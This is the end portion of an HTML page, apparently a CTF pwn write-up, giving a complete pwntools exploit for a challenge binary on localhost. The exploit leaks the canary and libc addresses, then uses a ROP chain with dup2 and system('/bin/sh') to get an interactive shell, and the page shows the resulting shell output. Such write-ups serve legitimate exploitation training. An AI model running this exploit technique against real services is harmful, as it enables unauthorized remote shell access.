style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">09:01</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">run</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">-rw-rw-r--</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">kali</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#005CC5;--1:#79B8FF">1353</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Dec</span><span style="--0:#24292E;--1:#E1E4E8">  </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">10:30</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">xpl.py</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">] Interrupted</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">] Closed connection to localhost port 31337</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ python3 xpl.py...SNIP...[+] Opening connection to localhost on port 31337: Done[*] Switching to interactive mode$ ls -latotal 6376drwxrwxr-x 2 kali kali    4096 Dec  5 10:30 .drwxrwxr-x 7 kali kali    4096 Dec  4 08:30 ..-rwxrw-r-- 1 kali kali   24601 Dec  5 09:01 chall-rwxrw-r-- 1 kali kali     117 Dec  5 09:01 compose.yml-rwxrw-r-- 1 kali kali     293 Dec  5 09:01 Dockerfile-rw------- 1 kali kali     212 Dec  5 10:24 .gdb_history-rwxr-xr-x 1 kali kali  236616 Dec  5 09:01 ld-linux-x86-64.so.2-rwxr-xr-x 1 kali kali 6229360 Dec  5 09:01 libc.so.6-rwxrw-r-- 1 kali kali    1236 Dec  5 09:01 main.c-rwxrw-r-- 1 kali kali      56 Dec  5 09:01 run-rw-rw-r-- 1 kali kali    1353 Dec  5 10:30 xpl.py$[*] Interrupted[*] Closed connection to localhost port 31337"><div></div></button></div></figure></div>
<p>The full exploit:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:48ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> socket</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">exe  </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> context.binary </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(</span><span style="--0:#032F62;--1:#9ECBFF">&#39;./chall&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(exe.libc.path)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> remote(</span><span style="--0:#032F62;--1:#9ECBFF">&#39;localhost&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">31337</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(p64(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1ff</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;A&#39;</span><span style="--0:#BF3441;--1:#F97583">*0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.sock.send(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;!&#39;</span><span style="--0:#24292E;--1:#E1E4E8">, socket.</span><span style="--0:#005CC5;--1:#79B8FF">MSG_OOB</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">leaks         </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> r.recv(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1ff</span><span style="--0:#24292E;--1:#E1E4E8">)[</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">:]</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">stack         </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(leaks[</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">:</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">]) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1f0</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">canary        </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(leaks[</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">:</span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc.address  </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(leaks[</span><span style="--0:#005CC5;--1:#79B8FF">24</span><span style="--0:#24292E;--1:#E1E4E8">:</span><span style="--0:#005CC5;--1:#79B8FF">32</span><span style="--0:#24292E;--1:#E1E4E8">]) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">2a1ca</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">exe.address   </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> u64(leaks[</span><span style="--0:#005CC5;--1:#79B8FF">56</span><span style="--0:#24292E;--1:#E1E4E8">:</span><span style="--0:#005CC5;--1:#79B8FF">64</span><span style="--0:#24292E;--1:#E1E4E8">]) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> exe.sym.main</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop  </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&#39;&#39;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">110a7d</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.dup2)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">110a7d</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.dup2)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">2882f</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10f78b</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">37</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(</span><span style="--0:#005CC5;--1:#79B8FF">next</span><span style="--0:#24292E;--1:#E1E4E8">(libc.search(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">38</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">rop </span><span style="--0:#BF3441;--1:#F97583">+=</span><span style="--0:#24292E;--1:#E1E4E8"> p64(libc.sym.system)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">payload </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> flat(</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;A&quot;</span><span style="--0:#BF3441;--1:#F97583">*0x</span><span style="--0:#005CC5;--1:#79B8FF">100</span><span style="--0:#24292E;--1:#E1E4E8">,                </span><span style="--0:#616972;--1:#99A0A6"># buffer</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">p64(</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">),                    </span><span style="--0:#616972;--1:#99A0A6"># padding</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">p64(canary),               </span><span style="--0:#616972;--1:#99A0A6"># canary</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">p64(</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">),                    </span><span style="--0:#616972;--1:#99A0A6"># rbp</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">rop                        </span><span style="--0:#616972;--1:#99A0A6"># rip</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">47</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">48</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(p64(</span><span style="--0:#005CC5;--1:#79B8FF">len</span><span style="--0:#24292E;--1:#E1E4E8">(payload)))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">49</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(payload)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">50</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">51</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.send(p64(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">200</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">52</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.clean()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">53</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">r.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#!/usr/bin/env python3from pwn import *import socketexe  = context.binary = ELF('./chall')libc = ELF(exe.libc.path)r = remote('localhost', 31337)r.send(p64(0x1ff))r.send(b'A'*0x100)r.sock.send(b'!', socket.MSG_OOB)leaks         = r.recv(0x1ff)[0x100:]stack         = u64(leaks[0:8]) - 0x1f0canary        = u64(leaks[8:16])libc.address  = u64(leaks[24:32]) - 0x2a1caexe.address   = u64(leaks[56:64]) - exe.sym.mainrop  = b''rop += p64(libc.address + 0x10f78b)rop += p64(4)rop += p64(libc.address + 0x110a7d)rop += p64(1)rop += p64(libc.sym.dup2)rop += p64(libc.address + 0x10f78b)rop += p64(4)rop += p64(libc.address + 0x110a7d)rop += p64(0)rop += p64(libc.sym.dup2)rop += p64(libc.address + 0x2882f)rop += p64(libc.address + 0x10f78b)rop += p64(next(libc.search(b&#34;/bin/sh\x00&#34;)))rop += p64(libc.sym.system)payload = flat(  b&#34;A&#34;*0x100,                # buffer  p64(0),                    # padding  p64(canary),               # canary  p64(0),                    # rbp  rop                        # rip)r.send(p64(len(payload)))r.send(payload)r.send(p64(0x200))r.clean()r.interactive()"><div></div></button></div></figure></div> </article>  <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/blackhat-mea-2025_verifmt#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" viewBox="0 0 24 24" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> Blackhat MEA CTF Final 2025 – pwn/verifmt </span> </div>  </a>  <a href="#" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full pointer-events-none opacity-50 cursor-not-allowed" aria-disabled="true">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> You&#39;re at the newest post! </span> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section> <button data-slot="button" class="items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9 group fixed right-8 bottom-8 z-50 hidden" id="scroll-to-top" title="Scroll to top" aria-label="Scroll to top"> <svg width="1em" height="1em" class="mx-auto size-4 transition-all group-hover:-translate-y-0.5" data-icon="lucide:arrow-up">   <symbol id="ai:lucide:arrow-up" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 12l7-7l7 7m-7 7V5"/></symbol><use href="#ai:lucide:arrow-up"></use>  </svg> </button> <script type="module">if(document.querySelector(".katex")&&!document.querySelector('link[href*="katex.min.css"]')){const e=document.createElement("link");e.rel="stylesheet",e.href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css",document.head.appendChild(e)}</script>  </main> <footer class="mx-auto mb-8 flex w-full max-w-3xl flex-col items-center justify-center gap-y-2 px-4 sm:mb-4 sm:flex-row sm:justify-between"> <div class="flex flex-wrap items-center justify-center gap-x-2 text-center"> <span class="text-muted-foreground text-sm">
&copy; 2025 z0v3r1n
</span> </div> <ul class="flex flex-wrap gap-2" role="list"> <li> <a href="https://github.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="GitHub" title="GitHub">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:github">   <symbol id="ai:lucide:github" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5c.08-1.25-.27-2.48-1-3.5c.28-1.15.28-2.35 0-3.5c0 0-1 0-3 1.5c-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.4 5.4 0 0 0 4 9c0 3.5 3 5.5 6 5.5c-.39.49-.68 1.05-.85 1.65S8.93 17.38 9 18v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></g></symbol><use href="#ai:lucide:github"></use>  </svg>  </a> </li><li> <a href="https://x.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Twitter" title="Twitter">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:twitter">   <symbol id="ai:lucide:twitter" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6c2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4c-.9-4.2 4-6.6 7-3.8c1.1 0 3-1.2 3-1.2"/></symbol><use href="#ai:lucide:twitter"></use>  </svg>  </a> </li><li> <a href="mailto:zoverin@proton.me" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Email" title="Email">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:mail">   <symbol id="ai:lucide:mail" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="m22 7l-8.991 5.727a2 2 0 0 1-2.009 0L2 7"/><rect width="20" height="16" x="2" y="4" rx="2"/></g></symbol><use href="#ai:lucide:mail"></use>  </svg>  </a> </li> </ul> </footer> </body></html> <script type="module">document.addEventListener("astro:page-load",()=>{const o=document.getElementById("scroll-to-top"),t=document.querySelector("footer");o&&t&&(o.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})}),window.addEventListener("scroll",()=>{const e=t.getBoundingClientRect().top<=window.innerHeight;o.classList.toggle("hidden",window.scrollY<=300||e)}))});</script>